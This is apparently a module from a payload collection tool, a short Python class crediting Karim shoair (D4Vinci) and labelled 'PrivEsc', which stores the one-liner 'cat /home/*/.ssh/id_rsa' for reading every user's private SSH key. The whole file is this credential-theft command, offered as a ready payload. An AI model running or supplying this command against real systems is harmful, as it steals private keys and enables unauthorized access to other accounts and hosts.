class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Read all private ssh keys for all users"
    function    = "PrivEsc"
    liner       = 'cat /home/*/.ssh/id_rsa'
